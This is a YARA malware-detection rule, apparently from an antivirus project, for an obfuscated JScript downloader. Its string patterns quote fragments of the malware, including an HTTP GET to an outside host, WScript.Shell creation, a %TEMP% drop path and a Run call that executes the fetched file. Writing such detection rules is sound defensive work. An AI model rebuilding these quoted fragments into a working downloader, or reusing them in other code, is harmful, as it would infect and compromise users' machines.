rule sig_20160427_e7bd2baf3aa77d2e51f8de58fa3d251f {
  meta:
    description = "datamaliciousorder - file 20160427_e7bd2baf3aa77d2e51f8de58fa3d251f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4d28d9a18fb83bafe33ac4ec23168d001fbfdabb8eb3fc587b432a765bcc5092"

  strings:
    $s1  = "PwfphJcvnt[XtqiaMpizg](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function AfxirUhcwc() {return XfvrfEgkvp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mnzyPKW" ascii
    $s3  = "function AfxirUhcwc() {return XfvrfEgkvp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mnzyPKW" ascii
    $s4  = "var XfvrfEgkvp = function XlyrzNlsih() {return PmjhcJacdt[OxtkeOgbij](\"WScript\"+\".Shell\");}(), JsoceZaiez = 11;" fullword ascii
    $s5  = "var PmjhcJacdt = this[\"WScript\"];" fullword ascii
    $s6  = "function VvkybCeoam(){return WucguVenqe + \"\";};" fullword ascii
    $s7  = "function TzappCgcac(MvygbJvatt, DvdbjJpxdi){GckooHchcy = GckooHchcy * 1; return MvygbJvatt - DvdbjJpxdi;};" fullword ascii
    $s8  = "if (PwfphJcvnt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function GcxmxObcyg() {return ((UetgqAwmoy == true) && (UetgqAwmoy == WgmadEkdlb)) ? 1 : GckooHchcy;};" fullword ascii
    $s10 = "}while (ZqjroRulll);" fullword ascii
    $s11 = "var WgmadEkdlb = false;" fullword ascii
    $s12 = "var EknuvMajvd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function AfzpdQwmhg(VlcmbMomex) {var WopkqHnpak = (1, 2, 3, 4, 5, VlcmbMomex); return WopkqHnpak;};" fullword ascii
    $s14 = "function PdkzoHebjx(){return OxtkeOgbij;};" fullword ascii
    $s15 = "WgmadEkdlb = true; " fullword ascii
    $s16 = "UetgqAwmoy = true; " fullword ascii
    $s17 = "MeznzKrxdd = true;" fullword ascii
    $s18 = "function LmoaoPvgtq(XkqqvQioce){XfvrfEgkvp[\"R\"+\"un\"](XkqqvQioce, GckooHchcy, GckooHchcy);};" fullword ascii
    $s19 = "function BrevaNijoe()" fullword ascii
    $s20 = "var UetgqAwmoy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}